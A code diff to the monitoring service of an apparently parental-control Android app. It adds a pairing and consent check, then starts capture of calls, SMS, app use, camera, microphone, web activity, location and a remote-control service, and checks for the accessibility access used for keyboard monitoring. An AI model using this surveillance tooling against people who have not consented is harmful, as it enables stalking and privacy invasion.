@@ -131,48 +131,149 @@ public class MonitoringService extends Service {
     
     private void startAllMonitors() {
         try {
+            // Verify prerequisites before starting any monitors
+            SharedPreferences prefs = getSharedPreferences("ParentalControl", MODE_PRIVATE);
+            boolean devicePaired = prefs.getBoolean("device_paired", false);
+            boolean consentGranted = prefs.getBoolean("consent_granted", false);
+            String parentId = prefs.getString("parent_id", null);
+            
+            if (!devicePaired || !consentGranted || parentId == null) {
+                Log.e(TAG, "Cannot start monitors - prerequisites not met");
+                stopSelf();
+                return;
+            }
+            
+            Log.i(TAG, "🚀 Starting all monitoring services with parent_id: " + parentId);
+            
+            // Start Call Log Monitor
             if (callLogMonitor != null) {
-                callLogMonitor.startMonitoring();
-                Log.d(TAG, "Call log monitor started");
+                try {
+                    callLogMonitor.startMonitoring();
+                    Log.d(TAG, "✅ Call log monitor started successfully");
+                } catch (Exception e) {
+                    Log.e(TAG, "❌ Failed to start call log monitor: " + e.getMessage());
+                }
+            } else {
+                Log.e(TAG, "❌ Call log monitor is null");
             }
             
+            // Start SMS Monitor
             if (smsMonitor != null) {
-                smsMonitor.startMonitoring();
-                Log.d(TAG, "SMS monitor started");
+                try {
+                    smsMonitor.startMonitoring();
+                    Log.d(TAG, "✅ SMS monitor started successfully");
+                } catch (Exception e) {
+                    Log.e(TAG, "❌ Failed to start SMS monitor: " + e.getMessage());
+                }
+            } else {
+                Log.e(TAG, "❌ SMS monitor is null");
             }
             
+            // Start App Usage Monitor
             if (appUsageMonitor != null) {
-                appUsageMonitor.startMonitoring();
-                Log.d(TAG, "App usage monitor started");
+                try {
+                    appUsageMonitor.startMonitoring();
+                    Log.d(TAG, "✅ App usage monitor started successfully");
+                } catch (Exception e) {
+                    Log.e(TAG, "❌ Failed to start app usage monitor: " + e.getMessage());
+                }
+            } else {
+                Log.e(TAG, "❌ App usage monitor is null");
             }
             
+            // Start Camera Monitor
             if (cameraMonitor != null) {
-                cameraMonitor.startMonitoring();
-                Log.d(TAG, "Camera monitor started");
+                try {
+                    cameraMonitor.startMonitoring();
+                    Log.d(TAG, "✅ Camera monitor started successfully");
+                } catch (Exception e) {
+                    Log.e(TAG, "❌ Failed to start camera monitor: " + e.getMessage());
+                }
+            } else {
+                Log.e(TAG, "❌ Camera monitor is null");
             }
             
+            // Start Microphone Monitor
             if (microphoneMonitor != null) {
-                microphoneMonitor.startMonitoring();
-                Log.d(TAG, "Microphone monitor started");
+                try {
+                    microphoneMonitor.startMonitoring();
+                    Log.d(TAG, "✅ Microphone monitor started successfully");
+                } catch (Exception e) {
+                    Log.e(TAG, "❌ Failed to start microphone monitor: " + e.getMessage());
+                }
+            } else {
+                Log.e(TAG, "❌ Microphone monitor is null");
             }
             
+            // Start Web Activity Monitor
             if (webActivityMonitor != null) {
-                webActivityMonitor.startMonitoring();
-                Log.d(TAG, "Web activity monitor started");
+                try {
+                    webActivityMonitor.startMonitoring();
+                    Log.d(TAG, "✅ Web activity monitor started successfully");
+                } catch (Exception e) {
+                    Log.e(TAG, "❌ Failed to start web activity monitor: " + e.getMessage());
+                }
+            } else {
+                Log.e(TAG, "❌ Web activity monitor is null");
             }
             
+            // Start Location Tracker
             if (locationTracker != null) {
-                locationTracker.startTracking();
-                Log.d(TAG, "Location tracker started");
+                try {
+                    locationTracker.startTracking();
+                    Log.d(TAG, "✅ Location tracker started successfully");
+                } catch (Exception e) {
+                    Log.e(TAG, "❌ Failed to start location tracker: " + e.getMessage());
+                }
+            } else {
+                Log.e(TAG, "❌ Location tracker is null");
             }
             
-            // Start remote control service as foreground service
-            Intent remoteControlIntent = new Intent(this, RemoteControlService.class);
-            startForegroundService(remoteControlIntent);
-            Log.d(TAG, "Remote control service started");
+            // Start Remote Control Service as foreground service
+            try {
+                Intent remoteControlIntent = new Intent(this, RemoteControlService.class);
+                startForegroundService(remoteControlIntent);
+                Log.d(TAG, "✅ Remote control service started successfully");
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Failed to start remote control service: " + e.getMessage());
+            }
+            
+            // Check Notification Listener status
+            try {
+                String enabledListeners = android.provider.Settings.Secure.getString(
+                    getContentResolver(), "enabled_notification_listeners");
+                if (enabledListeners != null && enabledListeners.contains(getPackageName())) {
+                    Log.d(TAG, "✅ Notification listener is enabled and active");
+                } else {
+                    Log.w(TAG, "⚠️ Notification listener not enabled - notifications won't be monitored");
+                    Log.w(TAG, "   Please enable notification access in Settings > Apps > Special Access > Notification Access");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Error checking notification listener: " + e.getMessage());
+            }
+            
+            // Check Accessibility Service status
+            try {
+                String enabledServices = android.provider.Settings.Secure.getString(
+                    getContentResolver(), android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+                if (enabledServices != null && enabledServices.contains(getPackageName())) {
+                    Log.d(TAG, "✅ Accessibility service is enabled and active");
+                } else {
+                    Log.w(TAG, "⚠️ Accessibility service not enabled - keyboard monitoring won't work");
+                    Log.w(TAG, "   Please enable accessibility service in Settings > Accessibility");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Error checking accessibility service: " + e.getMessage());
+            }
+            
+            // Log final status
+            Log.i(TAG, "🎯 All monitoring services initialization completed");
+            Log.i(TAG, "📊 Active monitors: Call Log, SMS, App Usage, Camera, Microphone, Web Activity, Location, Remote Control");
+            Log.i(TAG, "🔗 Parent ID: " + parentId);
+            Log.i(TAG, "📱 Device ID: " + DeviceUtils.getDeviceId(this));
             
         } catch (Exception e) {
-            Log.e(TAG, "Error starting monitors", e);
+            Log.e(TAG, "❌ Critical error starting monitors", e);
         }
     }
     
